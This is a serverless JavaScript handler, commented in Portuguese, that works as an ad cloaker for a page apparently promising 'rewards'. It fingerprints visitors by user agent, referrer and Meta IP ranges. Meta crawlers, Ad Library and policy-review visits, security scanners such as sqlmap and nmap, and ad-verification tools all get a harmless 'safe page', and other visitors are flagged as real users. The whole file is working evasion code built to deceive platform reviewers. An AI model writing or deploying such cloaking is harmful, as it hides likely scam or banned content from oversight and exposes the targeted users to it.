// api/cloak.js
// Server-side cloaker: detecta bots, revisores Meta e Ad Library
// Retorna JSON: { safe: true } se deve mostrar safe page, { safe: false } se é usuário real

export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', 'https://recompensasff.vercel.app');
  res.setHeader('Access-Control-Allow-Methods', 'GET');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');

  const ua     = (req.headers['user-agent'] || '').toLowerCase();
  const ref    = (req.headers['referer'] || req.headers['referrer'] || '').toLowerCase();
  const ip     = (
    req.headers['x-forwarded-for'] ||
    req.headers['x-real-ip'] ||
    req.socket?.remoteAddress || ''
  ).split(',')[0].trim();

  // ── 1. User-Agent blocklist ────────────────────────────────────────────────
  const BAD_UA = [
    // Facebook / Meta crawlers
    'facebookexternalhit', 'facebot', 'facebookcatalog',
    'meta-externalagent', 'metainspector',
    // Generic bots / scrapers
    'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'baiduspider',
    'slurp', 'sogou', 'exabot', 'ia_archiver', 'archive.org_bot',
    'python-requests', 'python-urllib', 'curl/', 'wget/', 'axios/',
    'java/', 'go-http-client', 'libwww-perl', 'scrapy',
    'headlesschrome', 'phantomjs', 'selenium', 'puppeteer',
    'playwright', 'webdriver', 'lighthouse',
    // Security scanners
    'netsparker', 'nikto', 'sqlmap', 'masscan', 'nmap',
    // Ad verification / compliance tools
    'adscanner', 'adsbot', 'moatbot', 'doubleverify', 'integral-ad',
    'grapeshot', 'gumgum', 'comscore', 'adscore',
  ];

  if (BAD_UA.some(b => ua.includes(b))) {
    return res.status(200).json({ safe: true, reason: 'bad_ua' });
  }

  // ── 2. Referrer blocklist (Ad Library, policy review pages) ───────────────
  const BAD_REF = [
    'facebook.com/ads/library',
    'facebook.com/adslibrary',
    'adslibrary',
    'facebook.com/policy',
    'facebook.com/help',
    'facebook.com/business/help',
    'web.facebook.com',
    'business.facebook.com',
    'adsmanager.facebook.com',
    'instagram.com/ads',
    'ads.google.com',
    'adwords.google.com',
    'google.com/intl/en/ads',
  ];

  if (BAD_REF.some(b => ref.includes(b))) {
    return res.status(200).json({ safe: true, reason: 'bad_ref' });
  }

  // ── 3. Known Meta / Facebook IP ranges (ASN 32934) ────────────────────────
  // Partial list — covers most review/crawler IPs
  const FB_IP_PREFIXES = [
    '31.13.', '66.220.', '66.228.', '69.63.', '69.171.',
    '74.119.', '102.132.', '102.133.', '129.134.',
    '157.240.', '163.70.', '163.77.',
    '173.252.', '179.60.', '185.60.', '204.15.',
  ];

  if (FB_IP_PREFIXES.some(prefix => ip.startsWith(prefix))) {
    return res.status(200).json({ safe: true, reason: 'fb_ip' });
  }

  // ── 4. Datacenter / VPN / hosting ASN (optional extra layer) ──────────────
  // IPs from common hosting providers often used by manual reviewers
  const DC_PREFIXES = [
    '208.115.', // SoftLayer / IBM
    '198.100.', // OVH
    '54.', '52.', '34.', '35.',   // AWS broad ranges
    '104.196.', '104.197.',       // GCP
  ];

  // We DON'T block datacenter broadly (too aggressive), only combined with suspicious UA
  const noUA = ua.length < 30; // extremely short UA = bot/tool
  if (noUA) {
    return res.status(200).json({ safe: true, reason: 'no_ua' });
  }

  // ── 5. All checks passed → real user ──────────────────────────────────────
  return res.status(200).json({ safe: false });
}
